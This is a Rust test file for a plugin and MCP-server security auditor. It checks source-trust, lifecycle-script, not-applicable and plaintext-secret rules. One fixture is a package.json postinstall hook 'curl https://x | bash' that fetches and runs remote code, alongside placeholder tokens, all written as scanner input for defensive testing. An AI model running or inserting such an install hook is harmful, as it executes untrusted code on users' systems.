//! Rules that read a whole item rather than its prose: the three MCP
//! rules over a server's command line, the two plugin rules over its
//! files, and the not-applicable reporting that keeps an unread input
//! from passing as a clean one.

use std::collections::BTreeMap;

use kendex_core::model::ItemKind;
use kendex_core::quality::{
    AuditInput, AuditResult, Content, McpEntry, PluginSources, Publisher, Severity, audit,
};

use super::rules::{mcp, rules_hit, severity_of, skill};

fn plugin(sources: PluginSources) -> AuditResult {
    audit(AuditInput {
        kind: ItemKind::Plugin,
        name: "sample@market".into(),
        harness: None,
        publisher: Publisher::Other,
        location: "plugins/sample".into(),
        content: Content::Plugin(sources),
    })
}

#[test]
fn plugin_source_trust_reports_a_missing_manifest_and_an_untracked_copy() {
    let loose = plugin(PluginSources::default());
    let severities: Vec<Severity> = loose
        .findings
        .iter()
        .filter(|f| f.rule == "plugin-source-trust")
        .map(|f| f.severity)
        .collect();
    assert_eq!(severities, vec![Severity::Medium, Severity::Low]);

    let tracked = plugin(PluginSources {
        manifests: vec!["plugin.json".into()],
        git_origin: Some("github.com/owner/repo".into()),
        ..PluginSources::default()
    });
    assert!(!rules_hit(&tracked).contains(&"plugin-source-trust"));
}

#[test]
fn plugin_lifecycle_scripts_weigh_a_fetching_script_over_a_quiet_one() {
    let fetching = plugin(PluginSources {
        manifests: vec!["package.json".into()],
        git_origin: Some("github.com/owner/repo".into()),
        package_json: Some(r#"{"scripts":{"postinstall":"curl https://x | bash"}}"#.into()),
        ..PluginSources::default()
    });
    assert_eq!(
        severity_of(&fetching, "plugin-lifecycle-scripts"),
        Some(Severity::Medium)
    );

    let quiet = plugin(PluginSources {
        manifests: vec!["package.json".into()],
        git_origin: Some("github.com/owner/repo".into()),
        package_json: Some(r#"{"scripts":{"prepare":"tsc -p ."}}"#.into()),
        ..PluginSources::default()
    });
    assert_eq!(
        severity_of(&quiet, "plugin-lifecycle-scripts"),
        Some(Severity::Low)
    );
}

/// A plugin that is only a declaration has no files. Both plugin rules must
/// say so rather than pass an item nobody read.
#[test]
fn plugin_rules_are_not_applicable_without_readable_sources() {
    let result = audit(AuditInput {
        kind: ItemKind::Plugin,
        name: "sample@market".into(),
        harness: None,
        publisher: Publisher::Other,
        location: "settings.json".into(),
        content: Content::Unread {
            why: kendex_core::quality::UNREADABLE_PLUGIN,
        },
    });
    let skipped: Vec<&str> = result
        .skipped
        .iter()
        .map(|entry| entry.rule.as_str())
        .collect();
    assert!(skipped.contains(&"plugin-source-trust"));
    assert!(skipped.contains(&"plugin-lifecycle-scripts"));
    assert!(result.findings.is_empty());
    assert_eq!(result.safety.score, 100);
}

/// A rule that never applies to this kind says nothing at all — being out
/// of scope is not the same as having no bytes to read.
#[test]
fn out_of_scope_rules_are_not_reported_as_skipped() {
    let result = skill(&[(
        "SKILL.md",
        "---\nname: sample\ndescription: when to use it\n---\n# sample\n",
    )]);
    let skipped: Vec<&str> = result
        .skipped
        .iter()
        .map(|entry| entry.rule.as_str())
        .collect();
    assert!(!skipped.contains(&"supply-chain"));
    assert!(!skipped.contains(&"plugin-source-trust"));
}

/// An MCP server observed as one entry inside a shared config file cannot
/// be judged from the observation alone.
#[test]
fn an_unread_mcp_entry_reports_its_three_rules_as_not_applicable() {
    let result = audit(AuditInput {
        kind: ItemKind::McpServer,
        name: "sample".into(),
        harness: None,
        publisher: Publisher::Other,
        location: ".mcp.json".into(),
        content: Content::Unread {
            why: kendex_core::quality::UNREAD_MCP_ENTRY,
        },
    });
    let skipped: Vec<&str> = result
        .skipped
        .iter()
        .map(|entry| entry.rule.as_str())
        .collect();
    assert!(skipped.contains(&"mcp-command-injection"));
    assert!(skipped.contains(&"broad-permissions"));
    assert!(skipped.contains(&"supply-chain"));
}

#[test]
fn a_clean_skill_scores_a_hundred_with_nothing_found() {
    let result = skill(&[(
        "SKILL.md",
        "---\nname: sample\ndescription: Use this when reviewing a pull request.\n---\n\n# sample\n\n- read the diff\n- name the risks in `plain` words\n",
    )]);
    assert!(result.findings.is_empty(), "{:?}", result.findings);
    assert_eq!(result.safety.score, 100);
}

#[test]
fn secrets_in_mcp_env_and_headers_are_both_found() {
    let mut env = BTreeMap::new();
    env.insert(
        "GITHUB_TOKEN".to_owned(),
        "ghp_0123456789abcdef0123456789abcdef0123".to_owned(),
    );
    let mut headers = BTreeMap::new();
    headers.insert(
        "Authorization".to_owned(),
        "Bearer sk-ant-abcdefghijklmnopqrstuvwxyz012345".to_owned(),
    );
    let result = mcp(McpEntry {
        command: Some("server".into()),
        env,
        headers,
        ..McpEntry::default()
    });
    let hits = result
        .findings
        .iter()
        .filter(|f| f.rule == "plaintext-secrets")
        .count();
    assert_eq!(hits, 2);
}
